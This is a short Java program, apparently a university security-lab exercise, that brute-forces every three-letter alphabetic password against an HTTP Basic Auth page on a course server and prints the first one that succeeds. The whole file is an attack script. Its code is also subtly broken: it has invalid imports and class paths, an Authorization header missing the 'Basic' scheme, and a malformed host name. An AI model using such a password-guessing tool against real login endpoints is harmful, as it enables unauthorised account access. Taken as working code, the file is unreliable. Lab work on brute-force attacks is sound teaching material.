

import java.net.*;
import java.io.*;
import java.misc.*;

public class BruteForce
{
   public static void main (String args[])
   {
      
      char[ ] var  = {
                       'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',   
                       'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',   
                       'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',   
                       'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',   
                       'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',   
                       'o', 'p', 'q', 'r', 's', 't', 'u', 'v',   
                       'w', 'x', 'y', 'z'                        
                       };

      

      String password;

      int m=0;
      
      for(int i=0; i<52; i++)
      {
         for(int j=0; j<52; j++)
         {
            for(int k=0; k<52; k++)
            {
               m++;
               password = "";
               password = new String(""+var[i]+var[j]+var[k]);
               String a = myurl("http://sec-crack.cs.rmit.edu./SEC/2", "", password,m );
            }
         }
      }
   }

   public static String encode (String source)
   {
      BASE64Encoder enc = new source.misc.BASE64Encoder();
      return(enc.encode(source.getBytes()));
   }

   
   public static String myurl (String url, String Name, String Password, int num )
   {
      String thisLine;
      String retVal;
      URL u;
      URLConnection uc;
      retVal = "";

      try
      {
         u = new URL(url);
         try
         {
            
            uc = u.openConnection();
            if (Name != null)
            {
               uc.setRequestProperty("Authorization", " " + encode(Name + ":" + Password));
            }
            InputStream content = (InputStream)uc.getInputStream();
            BufferedReader in = new BufferedReader (new InputStreamReader(content));

            String line;

            
            while ((line = in.readLine()) != null)
            {
               retVal += line;
               System.out.println(line);
               System.out.println("password="+Password+"; number:"+num);
               System.exit(0);
            }
         }
         catch (Exception e)
         {
            
            
         }
      }
      catch (MalformedURLException e)
      {
         return(url + " is not a parseable URL");
      }
      return retVal;
   }
}


